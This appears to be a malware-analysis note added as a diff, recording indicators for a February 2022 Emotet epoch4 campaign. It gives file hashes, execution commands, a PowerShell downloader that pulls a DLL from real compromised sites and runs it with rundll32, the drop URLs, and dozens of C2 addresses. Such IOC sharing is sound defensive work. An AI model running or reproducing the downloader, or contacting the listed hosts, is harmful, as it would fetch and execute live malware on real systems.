@@ -1,0 +1,102 @@
+Emotet 2022 - 07.02.2022 - epoch4
+
+.xls 60f3ffc1910096b5f7a6ca712618af18f7995d3b6d25a7ec7c285c9fc757deec
+
+.dll 937dc9c1d35085a37333f1af629af0c884480e8fea555682f831160d8e968486
+
+** Exec ** 
+wscript c:\programdata\yhjlswle.vbs
+
+cmd.exe /c ""C:\programdata\ughldskbhn.bat"
+
+.ps1 
+
+powershell  -enc $mjxdfshdrfgzses4 = "https://fullness-safety.com/-/P6x/", "https://nabajyotifoundation.com/da8uc7jo/4Za/", "https://dwwmaster.com/wp-content/ebHTB4UF2/", "http://formula8020.com/css/56Dzi0P/", "https://calad-formation.fr/r3x94z/kgZ9OGCi/", "http://lissbernardin.com/hthjb3i/x9KHpCeYrr/", "http://royalsnackmyanmar.com/wp-includes/GMtz6DxM/", "http://pristineservices.findfacts.co.in/cgi-bin/BuLyc2HKLHIQVHQLc/", "http://speedrankingsystem.de/wp-admin/k63ZcimPsE6/", "https://tigela.org.np/wp-content/Irp27O71/", "https://royaltyrealtynsb.com/backup_1/g51THhhLLUqodx6/", "http://bachilleratoporciclos.co/wp-content/PvIIx7/", "https://edu-media.cn/wp-admin/cKi/", "https://rtd.b2bpipe.cn/wp-content/8ESRhIJAIRh/"
+foreach ($yidsrhye34syufgxjcdf in $mjxdfshdrfgzses4) {
+  $gweyh57sedswd = "c:\\programdata\\bneuihlows.dll"
+  invoke-webrequest -uri $yidsrhye34syufgxjcdf -outfile $gweyh57sedswd
+  if (test-path "c:\\programdata\\bneuihlows.dll") {
+    if ((get-item "c:\\programdata\\bneuihlows.dll").length -ge 47436) {
+      break
+    }
+  }
+}
+
+cmd.exe /c start /B c:\windows\syswow64\rundll32.exe c:\programdata\bneuihlows.dll,hjyldksfkw3
+
+rundll32.exe  c:\programdata\bneuihlows.dll,hjyldksfkw3
+
+rundll32.exe c:\programdata\bneuihlows.dll",DllRegisterServer
+
+rundll32.exe C:\Windows\SysWOW64\Pecxr\rwnfkstliwuhnn.sjh,pXWAnDL
+
+rundll32.exe C:\Windows\System32\Pecxr\rwnfkstliwuhnn.sjh,DllRegisterServer
+
+
+.dll drops
+
+https://fullness-safety.com/-/P6x/
+https://nabajyotifoundation.com/da8uc7jo/4Za/
+https://dwwmaster.com/wp-content/ebHTB4UF2/
+http://formula8020.com/css/56Dzi0P/
+https://calad-formation.fr/r3x94z/kgZ9OGCi/
+http://lissbernardin.com/hthjb3i/x9KHpCeYrr/
+http://royalsnackmyanmar.com/wp-includes/GMtz6DxM/
+http://pristineservices.findfacts.co.in/cgi-bin/BuLyc2HKLHIQVHQLc/
+http://speedrankingsystem.de/wp-admin/k63ZcimPsE6/
+https://tigela.org.np/wp-content/Irp27O71/
+https://royaltyrealtynsb.com/backup_1/g51THhhLLUqodx6/
+http://bachilleratoporciclos.co/wp-content/PvIIx7/
+https://edu-media.cn/wp-admin/cKi/
+https://rtd.b2bpipe.cn/wp-content/8ESRhIJAIRh/
+
+
+c2's
+
+45.79.173.200:443
+144.76.186.55:7080
+207.38.84.195:8080
+82.165.152.127:8080
+45.118.115.99:8080
+50.116.54.215:443
+203.114.109.124:443
+178.128.83.165:80
+107.182.225.142:8080
+192.95.56.148:8080
+185.157.82.211:8080
+212.237.5.209:443
+212.24.98.99:8080
+162.214.50.39:7080
+162.243.175.63:443
+176.104.106.96:8080
+217.182.143.207:443
+144.76.186.49:8080
+58.227.42.236:80
+110.232.117.186:8080
+129.232.188.93:443
+45.142.114.231:8080
+46.55.222.11:443
+103.75.201.2:443
+131.100.24.231:80
+200.17.134.35:7080
+45.118.135.203:7080
+173.212.193.249:8080
+159.89.230.105:443
+160.16.102.168:80
+51.254.140.238:7080
+119.235.255.201:8080
+159.8.59.82:8080
+41.76.108.46:8080
+212.237.56.116:7080
+216.158.226.206:443
+178.79.147.66:8080
+158.69.222.101:443
+138.185.72.26:8080
+195.154.133.20:443
+164.68.99.3:8080
+212.237.17.99:8080
+81.0.236.90:443
+79.172.212.216:8080
+103.75.201.4:443
+45.176.232.124:443
+104.251.214.46:8080
